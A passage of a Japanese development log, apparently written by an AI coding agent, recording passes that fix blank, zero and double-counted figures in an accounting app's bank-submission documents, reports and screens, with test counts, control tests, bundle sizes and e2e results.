件の表が増えるだけ)。**出荷物が動いていないので実機を回す義務は無いが、e2e の runner 自身を直したので回した**: `perf` OK (LITE DCL 198 ms / heap 10.3 MB・FULL DCL 549 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**・組み直して **11,940,266 B / 3,352,785 B** を実測 (不変)。`typecheck` 緑・`verify:arch` のユニットテスト数を 15155 → 15172 へ (**今回も予想せず門に訊いた**))・**2026-09-22 パス 395 後の計測: 11,940,266 B / 3,352,785 B (両方 +1,398 B** —— 空欄の理由 3 文 (`noSalesRecordsSheetNote` / `noSalesRecordsNote` / `growthBlankSheetNote`) と `sales.hasData` の 1 欄・整形を通す `sv` / `salesValue` の 2 つ・画面の `<p>` 1 つの分。**増分の大半は日本語の文**で、docblock は最小化で落ちる。`renderer/data/` と `renderer/pages/` は両ビルドが読むので LITE も同じだけ増える。**金融機関等提出用の書面が、未入力の販売記録を「売上高 0・受注件数 0件」と事実として刷っていた。** パス 388 が「閉じていない物 (測った)」として残した 1 行 (「書面の `zeroRevenueRatioNote` が名指しするのは 8 つの**比率**で `損益分岐点売上高` は入っていない」) を閉じに行き、同じ節を測って**3 件出た**。実測 (2026-09-22):

| 見つけ方 | 欠陥 |
| --- | --- |
| コードを読む | **(A) §2 が未入力を 0 と刷る** —— 売上高（販売記録）`0` / 受注件数 `0件` / 販売チャネル数 `0`・caption は **null** |
| パス 388 の記録 | **(B) §1 の売上 0 の断りが空欄 9 つのうち 8 つしか名指ししない** (落ちていたのは 損益分岐点売上高) |
| **新しい機械** | **(C) §7「成長性」が 4 行を `―` にして caption が無い** (7 状態のうち **6 つ**) |

★ **(A) がいちばん重い** —— 空集合の和は算術としては 0 だが、紙の上の「販売記録の合計 = 0」は***売れていない*という事業についての主張**として読める。しかも同じ紙の §1 は 売上高 5,000,000 を出しているので、**1 枚の紙が売上について 5,000,000 と 0 を並べ、後者の入力が空であることを 1 文も言わない**。この紙は「上記のとおり相違ありません。」で代表者名つきで終わる。★ **同じ問いに、同じ紙が 2 通り答えていた** —— §1 は `const has = k.hasData` で `―` にして「KPI 実績が未入力のため算定していません。」と述べ、§3 の一人当たりも 2026-09-08 に同じ形を直している (「一人当たり売上高だけが `0` を刷り、隣の一人当たり人件費は ― だった」)。**紙の冒頭の注記自身が「該当なし・算定不能は「―」」と規約を宣言しており、§2 だけがそれを破っていた。** ★ **`sales.ts` の `aov` の docblock が、この表そのものを載せていた** —— パス 52 は 5 行のうち**真ん中の 1 行** (平均受注単価 0円 → ―) を直し「同じ節の中で『割れない』の答え方が 2 通り並んでいた」と書いたが、**上の 2 行は据え置かれた**。そちらは「割れない」ではなく「入っていない」だったので同じ網に掛からず、`lint:zero-fold` の母集団 (`?? 0` / `|| 0` / `? … : 0`) にも 1 件も現れない (**倒し込みの綴りを持たない 0** である)。★ **(C) は針を直した瞬間に出た** —— 最初は「空欄の**行**の label が紙のどこかに出ていること」を測ったが、健全な状態でも空欄は 37 行あり大半は節の caption (「貸借対照表が未入力のため算定していません。」が 10 行をまとめて説明する) で正しく覆われていた ——**行ごとに名指しさせると馬鹿げた注記になる**。**節**の単位に直すと §7 だけが鳴った: `caption: has ? null : …` なので実績が 1 期でも在れば caption が消える。**人が読んで見つけた 2 件の外に、機械が 3 件目を出した。** ★ **しきい値は 3 つとも違うので文を値から組む** —— 実測: 前期比 / CAGR は **2 期**から・売上トレンドは **4 期**から (移動平均の窓 3 + 1)・前年同月比は **13 期**から (前年同月の実績そのもの)。1 つの数を写すと `computeRevenueTrend` の窓を変えた日に紙が嘘をつく。★ **画面とレポートは正しく黙っていた (測った)** —— 画面は成長の枠を `revenueGrowthPct !== null || revenueCagrPct !== null` で丸ごと隠し、レポートは `if (… !== null)` の行だけを積む。実測でレポートは 前期比 / 平均成長率 / 売上トレンド / 前年同月比 / CAGR の**どれも 0 件**。**空欄を出さない面に理由は要らない** (パス 388 の `silent-but-correct`) —— 空欄を出すのは書面だけで、その書面だけが黙っていた (**パス 387 とまったく同じ向き**)。★ **画面は (A) と同じ形だった** —— 4 枚のタイルのうち `平均注文単価` だけが `—` で、総売上 `￥0` / 総注文件数 `0` / 販売チャネル数 `0` を刷っていた (**書面 §2 とまったく同じ非対称**)。**直し**: ① 信号は 1 つ `sales.hasData`(= `input.sales.length > 0`・`kpi.hasData` と同じ役目) で、**記録の件数そのもので測る** —— `totalAmount > 0` を写すと**返品で合計が 0 になった月を「未入力」と言い始める** ② 文は面ごとに 2 つ (画面は「「売上集計」の画面で記録を追加すると算定します」と**逃げ口を名指しし**、紙は「販売記録が未入力のため算定していません。」と §1 と同じ言い方をする) ③ (B) は比率の括弧には入れない —— **損益分岐点売上高は比率ではなく金額**なので種類として誤りになる。別の文にして**上で空と述べた限界利益率から導く** (「損益分岐点売上高（固定費 ÷ 限界利益率）も、限界利益率が算定できないため算定していません。」)。★ **既存の検査 4 件が、この 3 つの欠陥を仕様として留めていた** (法則 `no-weakness-as-spec` の、このセッションで最も明白な形): ① `it('販売: 記録が無ければ単価・主力チャネルは「―」、件数は 0')` —— **題名が 0 を名乗る** ② `it('★ 販売記録が無ければ ―、売上高と受注件数は 0 のまま (額と比率を分ける)')` —— 括弧が分け方を正当化するが、**受注件数は比率ではなく件数**で、**主力チャネルは額でも比率でもない**のに空欄である (述べた規則が、自分の主張している物を説明していない)。しかも同じ describe の docblock は「1 つの節に答え方が 2 通り並んでいた」と**正しく述べたまま**、直した後も 2 通り (空欄 3・0 が 2) を主張していた ③ `expect(section(m.sections, '2.').caption).toBeNull()` に「販売記録が 1 件も無い控えでは §2 に述べることが無い」 ④ `expect(section(m.sections, '7.').caption).toBeNull()`。**全文の見本 2 本も両方の状態を凍結していた。** 機械は `blankRowReasonOnSheet.test.ts` (20 件) が **状態 7 × 節の不変条件**(空欄を 1 つでも出す節は caption を持つ・走査が空虚でない床つき) と、(A)(B)(C) それぞれの回帰を持ち、`blankReasonMatrix` に `no-sales-records` の行 (4 面) と画面のタイル 2 件を足した (**タイルは構造で引く** —— 断りの文が 4 つの label をそのまま名指しするので `t.indexOf('総売上')` は**タイルではなく断りの文に当たる**・最初にそう書いて落ちた)。対照 **7 方向すべて鳴る**: A §7 の caption を戻す ❌6 (**§7 を名指しして 5 状態で**) / B §2 の数値を無条件へ ❌1 (`expected '0' to be '―'`) / C §2 の caption を外す ❌6 (**§2 を名指しして**) / D 損益分岐点の 1 文を外す ❌2 / E `hasData` を `totalAmount > 0` へ ❌1 (**返品で 0 になった月**) / F 画面の断りを消す ❌2 / G 画面のタイルを戻す ❌1 (`expected '￥0' to be '—'` —— **欠陥がそのまま再現する**)。法則 **95 本目** `blank-states-its-reason`・`no-zero-fold` に「**『割れない』と『入っていない』は別の 0** で、後者は倒し込みの綴りを持たないのでこの門の母集団に現れない」を足した。`typecheck` 緑・`npm test` **813 / 18,088**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15137 → 15150 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 219 ms / heap 10.3 MB・FULL DCL 563 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**。★ **これは残作業 #74 の「忠実な条件」の 1 反復でもある** —— パス 393 の揺れは**連鎖の中**で出たので、今回は `perf → e2e → e2e:lite` を**続けて 1 度**回した (孤立実行ではない)。**再現しなかった** —— 1 反復なので解決ではないが、条件を合わせた観測が 1 つ増えた (前回は条件そのものが違っていた)**・2026-09-22 パス 394 後も 11,938,868 B / 3,351,387 B で byte 単位で不変** (足したのは `shared/isoDate.ts` の `isoMonthOf` と `main/clients/freee.ts` の配線・検査 1 本だけ。**`isoMonthOf` は `shared` に在るが読むのは main だけ**なので、ブラウザ版の bundle からは tree-shaking で丸ごと落ちる —— **両方を組んで +0 B / +0 B を実測した**。だから実機は回していない。**第三者 (freee API) の取引日が「長さ 7」だけで月キーになっていた。** `aggregateDeals` は `month = (d.issue_date ?? '').slice(0, 7)` を `length !== 7` だけで検めており、**形は見ていなかった**。実測 (2026-09-22 · 直す前):

| `issue_date` | 結果 |
| --- | --- |
| `'abcdefg'` | 月キー **`'abcdefg'`**・`skippedNoDate` は **0** |
| `'9999-13-01'` | 月キー `'9999-13'` |
| `20250615` (数) | `.slice` が無く **TypeError** —— **1 件で全月が落ちる** |

★ **同じ関数の 2 行下は正しく検めていた** —— `amount` は `Number.isFinite` で落とし、その注記が理由まで書いている (「`jsonFetch` は `JSON.parse(...) as T` で形を確かめないので…NaN を足すとその月の net が NaN、営業CF 累計も NaN で、**銀行提出用書面がそれを刷る**」)。**月だけが検められていなかった。** ★ **どこまで届くか** —— `latestMonth` は綴りの最大で決まる (`accounting.ts` の「最新月は**綴りで**決める」) ので `'abcdefg' > '2025-06'` が成り立ち **「最新月」になる**。そこから **金融機関等提出用の書面**が会計連携の対象期間として刷り (`bankSubmission.ts:566` の `formatPeriodRange(firstMonth, latestMonth)`)、経営レポート (`managementReport.ts:176`)・画面の Tile (`OverviewPage.tsx:1531` の `直近月 (…)`)・鮮度の判定 (`accountingRecency`) にも入る。★ **散文は 3 か所で既に正しいことを述べていた** —— `skippedNoDate` の名前は「取引日が読めない取引」、`shared/freeeIntake.ts` は「`issue_date` が **`YYYY-MM` として読めない**取引を外す」、そして `shared/isoDate.ts` 自身が「**`slice(0, 10)` では切る位置がずれる**」・`balanceSheetFreshness.ts` が「月の文字列は**一致した部分から作る**」と書いている。**規則は 3 度書かれていて、実装だけが追いついていなかった。** **直し**: 月を**切らずに作る** 1 つの口 `isoMonthOf(v: unknown): string | null` を `shared/isoDate.ts` の判定関数の隣へ置き、freee がそれを通す。**型も見る** —— `parseIsoDate` は `String(iso)` で読むので配列 `['2026-01-31']` を通すと**同関数の注記が自分で名指ししている**ので、`isCalendarMonth` と同じく `typeof` を先に見る。`YYYY-MM-DD` の契約は型宣言 (`/** 発生日 (YYYY-MM-DD)。 */`) と既存の標本 6 件が示しており、**正常な入力の答えは 1 つも変わらない** (`'2025-06-15'` → `'2025-06'`・`'2025-06'` → `'2025-06'`)。対照 **3 方向すべて鳴る**: A 切る形へ戻す ❌4 (**`expected [ '2025-06', 'abcdefg' ] to deeply equal [ '2025-06' ]` と `TypeError: (d.issue_date ?? "").slice is not a function` —— 2 つの欠陥がそのまま再現する**) / B `isoMonthOf` から `typeof` を外す ❌2 (`expected '2026-01' to be null` —— `parseIsoDate` の注記が名指しする穴) / C 外したのを数えない ❌5。★ **既存の検査が弱さを利用して mutant を撃墜していた** —— `freee.test.ts` の題名は「`?? ""` fallback → length 0 skip」で、注記は「`?? ''` を別文字列にする mutant は **`"Stryker"`(len7) を月扱いしてしまう**ため…撃墜」と書いていた。**その「月扱いしてしまう」が欠陥そのもの**である (法則 `no-weakness-as-spec` の形)。`?? ''` ごと無くなったのでその mutant も無い —— **主張は変えず** (取引日の無い取引が出力に出ないこと) 題名と注記を実測へ直した。★ **母集団を測った** —— `slice(0, 7)` は 8 件で、危ない形 (**第三者の値を切って期のキーにする**) は **freee の 1 件だけ**。残りは自分が組んだ `YYYY-MM-DD` を切る所か注記である。`main/clients/ollama.ts:236` の `(m.modified_at ?? '').slice(0, 10)` は**同じ throw の形**だが、行き先がモデル一覧の表示だけなので **stakes が違う** (記録のみ・直していない)。`typecheck` 緑・`npm test` **812 / 18,059**・`verify:all` exit 0)・**2026-09-22 パス 393 後の計測: 11,938,868 B / 3,351,387 B (FULL −31 B・LITE −33 B** —— 判定を共有の 1 つへ寄せた分。**減るのは、`docImports` が持っていた `PERIOD_RE` の import と 2 つの `.test()` を落とし、代わりに呼ぶ漏斗は既に束に在るため** (足したのは断りの呼び出し 1 つと分岐 1 つ)。★ **FULL と LITE の差 2 B は説明できていない** —— 両ビルドの差は学術コーパスだけなので renderer の変更は同じだけ動くはずで、識別子の短縮か chunk の境目の差と見ているが**確かめていないので断定しない**。**計算書類が、アプリ自身が「読めない」と宣言した期の行を合算し、売上高が 10 倍になっていた。** パス 392 の直後に「他に同じ形が在るか」を測り、`DocstudioPage` が `KPI_ACTUALS_COLLECTION` を購読しているのに漏斗の呼び手の一覧に居ないことから辿った。`buildKessanImport` は事業年度を**文字列の大小だけ**で切り出していた (`r.period >= fy.from && r.period <= fy.to`)。文字列の大小は `YYYY-MM` の形を要求しないので、**窓に入るが読めない**形が通る —— 実測 (`fy = 2025-04〜2026-03`) で **6 形**: `'2025-6'` / `'2025-13'` / `'2025-06-15'` / `'2025-99'` / `'2025-1x'` / `'2026-00'`。★ **同じ形が 3 か所に在り、選別を落としていたのは 1 か所だけだった** —— 同じ関数の `else` の枝は `PERIOD_RE.test` で選別し、兄弟の `docImports.ts` の事業計画書も `valid.filter(...)` で先に選別していた。**枝が 1 つ選別を忘れていた。** 実測 (読める 1 件 100 万 + `'2025-6'` の 1 件 900 万):

| 面 | 売上高 |
| --- | --- |
| **計算書類 (損益計算書)** | **10,000,000** —— 読めない 1 行で **10 倍** |
| 事業計画書 | 1,000,000 |
| 経営サマリー | 1,000,000 (`unreadablePeriods = 1`) |

★ **その行の出所は `KPI 実績 (2025年4月〜2026年3月)` と事業年度の窓を名乗る** —— その窓のどの月にも無い行を含んでいる。注記も棚卸と雑費の 2 件だけで、混ぜたことを 1 文も言っていなかった。**これはパス 390〜392 の家系のいちばん重い現れ**である: 経営サマリーは画面だが、計算書類は**金融機関と税務へ出す紙**で、`DocstudioPage` の紙は「上記のとおり相違ありません」で代表者名つきで終わる。**直しは既存の物へ寄せるだけ**: ① 事業年度の枝を `readablePeriodRows` (パス 225 の漏斗・経営サマリー / 書面 / レポートが読むのと同じ 1 つ) へ通す ② 落とした件数を `unreadablePeriodSheetNote` が**紙に述べる** —— 黙って除くと売上高が小さく出て利用者は気づけず、除かないと 10 倍になる。**どちらにしても「何件を除いたか」は紙に要る** (パス 392 と同じ向き・文は書面 / レポートと**同じ 1 つ**) ③ 兄弟の `docImports` の boolean の判定 2 つも共有の判定へ寄せた。★ **これで `PERIOD_RE` は「組 (年・月) を取る」3 か所だけになった** —— `calendarDateCensus.test.ts` の ALLOWED がこの写しを免除している理由が「期 (YYYY-MM) の組を取り、3 か所で使う」で、**実物は 7 か所のうち 4 か所が boolean の判定だった** (免除の理由が実物より狭く、しかも狭い側が正しかった)。今は理由どおりになった。★ **パリティが load-bearing になった** —— `monthLabel` / `lastDayLabel` は `PERIOD_RE.exec(period)!` と**非 null 断定**で組を取り、docblock は「呼ぶ側が正規表現で確かめた期だけを渡す」と書いている。選別を共有の判定へ移したので、**2 つの受理集合が割れるとその `!` が TypeError になり、計算書類を組む途中で投げる** (利用者は紙を出せない)。だから一致を機械が持つ —— 標本は手で選んだ 25 形 + **月を総当たり (00〜99)** で、実測 **食い違い 0 件**・両方 true が 12 以上・両方 false が 20 以上 (走査が空虚でない床)。「共有の判定が通した期で `monthLabel` が投げない」も別に主張する。対照 **4 方向すべて鳴る**: A 事業年度の枝を文字列の大小だけに戻す ❌3 (**`expected '10000000' to be '1000000'` —— 欠陥がそのまま再現する**) / B 紙の断りを消す ❌2 / C `PERIOD_RE` の月を `\d{2}` へ緩める ❌2 (**食い違った 86 の月を名指しする**) / D `isValidPeriod` を何でも通す ❌8。★ **決算期に実績が無い枝も別に見た** —— `else` の側 (入力済みの全期間を合算) でも合算しないことと断りが出ることを主張する (直す前から選別は在ったが、`readable.rows` へ寄せたので**回帰の見張りを両枝に置く**)。`typecheck` 緑・`npm test` **811 / 18,048**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15116 → 15126 へ —— **今回も予想せず門に訊いた**)。**鎖は触っていない** (`kessanImport.ts` / `docImports.ts` は保護対象ではない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 220 ms / heap 10.3 MB・FULL DCL 591 ms / heap 37 MB)・`e2e:lite` **455 件 ❌ 0**。★ **`e2e` (FULL) は連鎖の中で 1 回 `TimeoutError` で落ち、単独で再走すると 455 件 ❌ 0 だった** —— **再現しなかったので「緑」とは書かない**。同じ renderer を読む `e2e:lite` が同じ連鎖の中で 455 件通っていることは 「私の変更による退行ではない」側の証拠だが、**証明ではない**。パス 331 / 332 / 334 / 335 と同じ家系 (連鎖の負荷の下でだけ出る揺れ) に見える —— パス 335 がその家系の原因を 1 つ (teamradar の見本が下書きを潰す) 特定して直しているが、**これが同じ原因かは分からない**。★ **自戒: どの suite で落ちたかを私が捨てた** —— 連鎖を `npm run e2e 2>&1 | tail -3` で回したので、suite ごとの `(name: N 件)` の行が全部落ち、残ったのは stack の 3 行だけだった。**落ちたときに要る情報を、落ちる前に切っていた。** 次からは `tail -40` か suite の行を grep する)・**2026-09-22 パス 392 後の計測: 11,938,899 B / 3,351,420 B (両方 +279 B** —— 経営サマリーの 2 つの読み手を既存の漏斗へ通し、断りを 1 つ描くようにした分 (**新しい関数は 1 つも作っていない**)。`renderer/pages/` は両ビルドが読むので LITE も同じだけ増える。**「画面が黙っている」を測りに行ったら、同じ画面が同じ売上高について 3 つの答えを出していた。** 期が読めない行 (`period` が `'YYYY-MM'` でない —— 保管層の形は `period: str` だけなので復元や古い版の控えが持ち込める・`collectionShapes.ts` の `KPI_SHAPE` で実測) を 1 件混ぜて実測 (読める 1 件 100 万 + 期が `'bad'` の 1 件 999 万 9,999):

| 読み手 | 売上高 | 漏斗 |
| --- | --- | --- |
| `buildBusinessOverview` → 収益性 (KPI) のタイル | **1,000,000** | `readablePeriodRows` ✅ |
| `summarizeFundamentals(素の購読)` → 損益感度分析 | **10,999,999** | **無し** ❌ |
| `monthlyTrendSeries(素の購読)` → 月次推移 | 期が **`bad`** の行・前期比 **+900%** | **無し** ❌ |

★ **いちばん重いのは月次推移で、アプリ自身が「読めない」と宣言した期に対して成長率を計算していた** —— 表は `bad ￥9,999,999 ￥9,999,999 100.0% +900%` と並び、`period` の欄には**保存値の生の文字列**が出る。感度分析は「損益分岐点まで売上 **-98.1%** の余地があります」と、汚染された合計から導いた助言を出していた。★ **そして `monthlyTrend` は `buildManagementReport` へ渡る** —— レポートは「期 (YYYY-MM) が読めない 1 件は集計から除いています」と**述べながら**、同じ紙に `bad` の行と ￥9,999,999 を刷っていた (実測で `reportSaysUnreadable` / `reportHasBadRow` / `reportHas9999999` の **3 つとも true**)。**自分の断りと矛盾する紙**で、このセッションで見つけた家系のいちばん鋭い形である。★ **画面の断りは 0 文だった** —— `overview.kpi.unreadablePeriods` の読み手は書面 (`bankSubmission.ts:348`)・レポート (`managementReport.ts:141`)・KPI 画面 (実績 / 予算を自前の `readable.dropped` で) の 3 つで、**`OverviewPage.tsx` は 0 件**。落ちた行は集計から除かれるので、画面の金額は利用者の記録より**小さく**出る —— パス 390 / 391 (倍に出る) の**裏返し**である。**直しは既存の物へ寄せるだけ**: ① `monthlyTrend` と `fundamentals` を `readablePeriodRows` (パス 225 の漏斗) へ通す —— **ここで絞り直さない** ② 断りは **`unreadablePeriodNote` の `kind` 引数で足りた** (`'実績・予算'`) ので**3 つ目の関数は作らない** —— 逃げ口 (設定の「形式の合わない記録」) はその文が既に名指ししている ③ 件数は `overview.kpi.unreadablePeriods` を読む (書面とレポートと同じ値なので**3 つの面が同じ件数を言う**)。★ **検査は 2 層** —— 行列に `unreadable-periods` の行 (4 面) を足し、**値そのものの一致**を見る 4 件を別に置いた (`★ 同じ画面の読み手が同じ漏斗を通る`)。後者が本体で、**`.tsx` は変異検査の対象外なので漏斗を外しても他の誰も鳴らない**。対照の標本 (`漏斗を通さなければ答えが割れる`) を同じ describe に置き、製品を壊さずに 12,199,999 と 2,200,000 の差を示す。対照 **4 方向すべて鳴り、A と B は別々の読み手で鳴る**: A `monthlyTrend` を素の購読へ戻す ❌1 (`期が読めない行が月次推移に並んでいる`) / B `fundamentals` を素の購読へ戻す ❌1 (`感度分析が漏斗を通っていない`) / C 画面の断りを消す ❌1 / D 漏斗が何も落とさない ❌7 (4 面 + 2 読み手 + 標本)。★ **自戒: probe が欄の名前を間違え、`+900%` を「JSX が計算している」と読みかけた** —— `monthlyTrendSeries` の欄は `revenueGrowthPct` で、私は `growthPct` を読んで `null` を得ていた。画面の文字列には `+900%` が在るのに data には無い、という食い違いを**製品の側の不思議**として説明しようとした一手前で、欄名を確かめて止まった。**画面と data が食い違ったら、まず自分の読み方を疑う。** `typecheck` 緑・`npm test` **810 / 18,038**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15112 → 15116 へ —— **今回も予想せず門に訊いた**)・`chain:verify` 緑 (block 252)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 234 ms / heap 10.2 MB・FULL DCL 593 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-22 パス 391 後の計測: 11,938,620 B / 3,351,141 B (両方 +497 B** —— 販売記録の重複を経営サマリーが断る 1 文 (`duplicateOrdersOverviewNote`) と、それを描く `role="alert"` 1 つの分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**パス 390 を直した翌手で、同じ欠陥が「別の入力」の側に残っていた。** 行列に足せる状態を探して `overview.sales.duplicateOrders` の読み手を数えると **2 つだけ** —— 書面 §2 (`bankSubmission.ts:393`) と売上集計の画面 (`SalesPage.tsx:101`・自前の `findDuplicateOrders`) で、**`OverviewPage.tsx` は 0 件なのに `:1223` で 総売上 / 総注文件数 / 平均注文単価 を出していた**。実測 (同じ注文名 `Shopify #1001`・500,000 円 × 1 件 を 2 件): `duplicateOrders = [{ref:'Shopify #1001', count:2}]` / **`totalAmount` が 500,000 → 1,000,000**・**`totalOrders` が 1 → 2**・`sheetSaysDup = true`・**`screenShows1M = true` / `screenSaysDup = false`** —— 画面は「販売記録 2026-08-01〜2026-08-01・1 か月分の累計です」という但し書きまで出しながら、**総売上 ￥1,000,000 を黙って刷っていた**。★ **パス 390 とまったく同じ形で、直した側の隣に残っていた** —— 販売記録と KPI 実績は**別の入力**なので、どちらか一方だけが重複していることが在りうる。パス 390 は `duplicateActuals` を直したが、`duplicateOrders` は別の欄・別の読み手で、**同じ画面の 20 行上に在った**。★ **文は 3 つ目が要った** —— `duplicateOrdersNote` (売上画面・末尾「一覧の × で余分な行を消してください」) は経営サマリーに一覧が無いので**この画面に無い物を指す**し、`duplicateOrdersSheetNote` は書面の言い方である。3 つ目は**どこで消せるかを名指しする** (「この画面の総売上・総注文件数はその重複を 2 度数えた値です。「売上集計」の画面で余分な行を消してください」)。法則 `escape-hatch-stays-open`。★ **レポートの cell は実測で `silent-but-correct` に決めた** —— `managementReport.ts` の `.sales.` 参照は **0 件**で、実測でも `reportHasSalesSection = false` / `reportSaysSales = false`。**重複した値を 1 つも刷らないので述べる必要が無い** —— 「たぶん要らない」ではなく測って書いた (法則 `measure-before-claim`)。★ **行列に 5 つ目の面を足した** —— `screen-sales` (売上集計の画面) と `salesRows`。`Surface` が 4 つのままだと「売上画面は述べる」が台帳に載らず、**3 つの文のうち 1 つが行列の外に居た**。seed も `seedFor(row)` に寄せた (画面はどちらの入力も購読しているので両方置く)。★ **関数の側の非対称も別に留めた** —— 行列は「画面がこの文を出す」を見るが、**3 つの文が同じ物になったら**行列の主張は満たされたまま「一覧の ×」が経営サマリーへ戻りうる (`wrong-reason-would-be` が 1 つの面しか見ていないため)。`★ 重複の断りは面ごとに別の文` の 3 件が関数を直接比べる。対照 **4 方向すべて鳴る**: A 画面の 1 文を消す ❌1 / B 経営サマリーの文を売上画面の文にする ❌2 / C 検出が常に `[]` ❌5 / D 正しい文の後ろに禁じた文を足す ❌2。★ **パス 390 の失敗を直した形で確かめた** —— あのとき対照 B は「肯定の cell が先に時間切れになる」ので `wrong-reason-would-be` の cell に 1 度も当たっていなかった。今回は **B の的を関数そのもの**にしたので `expected '…一覧の × で余分な行を消してください。' not to contain '一覧の ×'` と**何が起きたかを名指しして**鳴り、**D は正しい文を残したまま**禁じた文を足すので `画面が別の原因の文を出している` の側が当たる。★ **自戒: probe の `channel: 'ec'` は存在しないチャネルだった** —— vitest は型を剥がすので probe は緑で、`npm run typecheck` だけが `TS2322: Type '"ec"' is not assignable to type '"shopify" | "base" | …'` を 2 件出した。**測定そのものは生きていた** (`findDuplicateOrders` は `note` だけを見る・合計は `amount` の和) が、標本が製品の型を満たしていなかった —— パス 373 / 387 と同じ家系で、**このセッション 3 度目**である。`typecheck` 緑・`npm test` **810 / 18,029**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15108 → 15112 へ —— **今回は予想せず門に訊いた**。パス 390 で予想を外したので)・`chain:verify` 緑 (block 252)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 220 ms / heap 10.3 MB・FULL DCL 651 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-22 パス 390 後の計測: 11,938,123 B / 3,350,644 B (両方 +463 B** —— 重複した実績を経営サマリーが断る 1 文 (`duplicateActualsOverviewNote`) と、それを描く `role="alert"` 1 つの分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**パス 389 で作った行列に 4 つ目の状態を足そうとして、欠陥が 1 つ出た** —— **空欄ではなく、倍の金額だった。** 実測 (同じ (期, 事業) を 2 件入れる): `duplicateActuals.length = 1` / **`revenue` が 1,000,000 → 2,000,000**・書面は「同じ期・事業の実績が 1 組重複しており…**本表の金額はその合算値です**」と述べ、レポートも述べるのに、**経営サマリーは `screenSaysDup=false` / `screenShows2M=true`** —— 断りを 1 文も出さずに **￥2,000,000** を刷っていた。★ **これは空欄より重い** —— 空欄は「出せなかった」と読めるが、**倍の金額は権威を持って読める**。しかも経営サマリーは「金融機関等提出用の書面」と「経営レポート」の元になる画面なので、利用者はここで見た数字を信じて書面を出す。**パス 126 が直した欠陥 (同じ CSV を 2 度読むと売上高と受注件数が 2 倍になり書面 §2 まで届く) と同じ家系**だが、あちらは**取り込みが断らない**側で、こちらは**入ってしまった後に画面が黙る**側である。★ **文は 3 つ目が要った (借りられなかった)** —— 既に `duplicateActualsNote` (画面用・末尾「**一覧の × で余分な行を消してください**」) と `duplicateActualsSheetNote` (書面用・末尾「**本表の金額はその合算値です**」) が在ったが、**どちらも経営サマリーには当てはまらない**: 経営サマリーに一覧は無いので × で消せず、「本表」と言う紙でもない。3 つ目は**どこで消せるかを名指しする** (「この画面の金額はその合算値です。『KPI 実績』の画面で余分な行を消してください」) —— 法則 `escape-hatch-stays-open` の形で、逃げ口が別の画面に在るなら**その画面の名前を言う**。判定そのもの (`findDuplicateActuals`) は 1 つのまま増やしていない。★ **行列に足すには器を広げる必要が在った** —— 行が `actual: KpiActual` (1 件) だったので、**複数行の状態を表せなかった**。`rows: readonly KpiActual[]` にした (状態が 2 件以上の行から生まれる家系は他にも在る —— 期が読めない行・上書き)。行列は **15 → 19 件**。対照 **4 方向すべて鳴る**: A 画面の 1 文を消す ❌1 / B 画面に KPI 実績の文面を使わせる ❌1 / C 検出が常に `null` ❌1 / D 正しい文の後ろに禁じた文を足す ❌1 (`画面が別の原因の文を出している … not to contain '一覧の × で余分な行を消…'`)。★ **対照 B は鳴ったが、鳴った理由が私の狙いと違った** —— 文面を差し替えると**肯定の cell が先に時間切れになる**ので、`wrong-reason-would-be` の cell は 1 度も当たっていなかった。**「落ちた」ことは「狙った門が鳴った」ことではない** (法則 `measure-before-claim`)。D を足して、正しい文を残したまま禁じた文を足したときに鳴ることを確かめた。★ **自戒: 錠を「両方の状態に在る文」に置いた** —— 最初の probe は `'収益性'` を待っていたが、この見出しは**実績が入る前から出ている**ので、KPI の記録が届く前に測って「未入力」の差し込みを掴んでいた (`notesSlot=true`)。データが在るときだけ描かれる `'安全余裕率'` へ錠を移した —— **パス 376 で「ラベルは先に出て、算定された値は後から来る」と自分で書いた当のことを、2 パス後にまた踏んだ。** ★ **読み進めたら判定が反転した (このセッション 3 度目)** —— `staleDerived` の枝の 1 行目は一般的な文に見えたが、**次の行が `applied.staleDerived.map((d) => d.label).join(' / ')` を描いており**、中身は同等だった。欠陥ではないので触らず、記録した。★ **メトリクスの予想も外れた** —— 15112 と書いたが門は 15108 と答えた: 行列の行を 1 つ足すと `describe.each` が**実行時の件数を 4 つ増やす** (18,013 → 18,017) が、**静的な `it(` は 1 つも増えない**。門が正しく、私の予想だけが誤りだった。`typecheck` 緑・`npm test` **810 / 18,017**・`verify:all` exit 0 (ユニットテスト数は 15108 のまま)・`chain:verify` 緑 (block 252)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 216 ms / heap 10.3 MB・FULL DCL 587 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-22 パス 389 後も 11,937,660 B / 3,350,181 B で byte 単位で不変** (足したのは検査 1 本だけ —— **`__tests__/` は出荷物に入らない**。両方を組んで実測した。**4 パス続けて同じ家系から出たので、面の側から数える機械を作った。** パス 382 (画面の門が結果に掛かり 28 欄で黙る) / 386 (画面が `∞` を刷り理由 0 文) / 387 (**書面**に理由がどこにも無い) / 388 (理由は出すが**原因が違う**) —— **4 回とも人が grep して見つけた**。共通の不変条件は 1 つで、**ある状態で欄が空になるなら、その欄を出している面はすべて理由を出し、しかもその理由は原因を言い当てている**。`blankReasonMatrix.test.ts` (15 件) が **状態 × 面**の行列を持つ —— 状態 3 (`contribution-le-0` / `zero-revenue` / `no-members`) × 面 4 (経営サマリー / KPI 実績 / レポート / 書面) を**実際に描き・組んで**当てる。★ **cell の種類が 3 つ在るのが要点である**: ① `reason` = その面はこの文を出す ② **`wrong-reason-would-be` = 出してはいけない文** (パス 388 の欠陥は「理由が無い」ではなく「別の原因の文が出ていた」ので、**否定の側も要る**) ③ **`silent-but-correct` = その面はその欄そのものを出さないので理由は要らない** —— 